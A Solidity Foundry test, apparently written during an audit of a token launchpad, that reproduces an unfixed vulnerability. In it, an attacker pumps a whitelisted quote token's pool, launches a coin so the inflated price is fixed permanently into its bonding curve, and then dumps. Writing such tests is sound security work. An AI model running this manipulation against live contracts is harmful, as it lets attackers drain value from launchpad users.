// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// OPEN FINDING (docs/audit-2026-11-14.md): this test demonstrates a vulnerability that is NOT fixed yet and
// passes while it exists. When the fix lands, invert its assertions into a regression test.

// LB-01: a whitelisted ("listed") quote is priced from LIVE SPOT at launch. A pump of the quote's route pool around
// Launchpad.launch bakes a wrong quote/USD price into the curve (and later into the hook) forever.
// Place in contracts/test/ and run: forge test --match-contract LB01_ListedQuoteSpotAtLaunch -vv

import {IntegrationBase} from "./integration/IntegrationBase.sol";
import {BondingCurve} from "../src/BondingCurve.sol";
import {ILaunchpad} from "../src/interfaces/ILaunchpad.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

contract LB01_ListedQuoteSpotAtLaunch is IntegrationBase {
    address internal attacker = makeAddr("attacker");

    /// @dev exactly what script/whitelist/README.md tells the owner to do (1-hop route = the same ref pool here)
    function _whitelistStrategy() internal {
        PoolKey[] memory keys = new PoolKey[](1);
        keys[0] = strategyUsdgKey;
        vm.startPrank(owner);
        pricer.setAllowedQuote(address(strategy), true);
        pricer.setPriceRoute(address(strategy), keys);
        vm.stopPrank();
    }

    function _swap(address from, address tokenIn, uint256 amountIn) internal {
        PoolKey memory key = strategyUsdgKey;
        bool zeroForOne = Currency.unwrap(key.currency0) == tokenIn;
        vm.startPrank(from);
        IERC20(tokenIn).approve(address(swapRouter), amountIn);
        swapRouter.swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amountIn),
                sqrtPriceLimitX96: zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        vm.stopPrank();
    }

    function _launchStrategy(address who) internal returns (BondingCurve) {
        vm.prank(who);
        ILaunchpad.LaunchResult memory r = launchpad.launchCoin(
            ILaunchpad.LaunchParams({
                name: "Coin",
                ticker: "C",
                imageURI: "ipfs://img",
                description: "",
                socialsURI: "",
                quote: address(strategy),
                creatorTaxBps: 0,
                creatorBuyQuoteIn: 0,
                creatorBuyMinTokensOut: 0,
                deadline: vm.getBlockTimestamp() + 1 days
            })
        );
        return BondingCurve(r.curve);
    }

    function test_flashPumpedQuotePriceIsBakedIntoCurve() public {
        _whitelistStrategy();
        uint256 fair = pricer.quotePriceUsd(address(strategy));
        assertEq(fair, 1e18, "STRATEGY = $1");

        BondingCurve honest = _launchStrategy(creator);
        assertEq(honest.quotePriceUsd(), fair, "control launch");

        // Attack (one tx in practice, via a helper contract): pump STRATEGY in its route pool, launch, dump.
        uint256 pump = 60_000 * U;
        quote.mint(attacker, pump);
        _swap(attacker, address(quote), pump);
        BondingCurve evil = _launchStrategy(attacker);
        _swap(attacker, address(strategy), strategy.balanceOf(attacker));

        uint256 baked = evil.quotePriceUsd();
        emit log_named_decimal_uint("baked quote/USD", baked, 18);
        emit log_named_decimal_uint("attacker cost (USDG, swap fees)", pump - quote.balanceOf(attacker), 18);
        assertGt(baked, 2 * fair, "pumped price baked into the curve (immutable)");
        assertApproxEqRel(pricer.quotePriceUsd(address(strategy)), fair, 0.01e18, "live price back to fair");

        // The curve REPORTS the constitution's $3,333 start mcap ...
        assertApproxEqRel(evil.marketCapUsd(), 3_333e18, 0.001e18);
        // ... but its real USD start mcap (at the fair quote price) is less than half of it,
        uint256 realStartUsd = evil.marketCapQuote() * fair / 1e18;
        emit log_named_decimal_uint("real start mcap USD", realStartUsd, 18);
        assertLt(realStartUsd, uint256(3_333e18) / 2);
        // and the whole curve (graduation raise, LP seed, floor) is > 2x smaller in real terms.
        (,, uint256 x0h,) = honest.curveParams();
        (,, uint256 x0e,) = evil.curveParams();
        assertGt(x0h, 2 * x0e);
    }
}
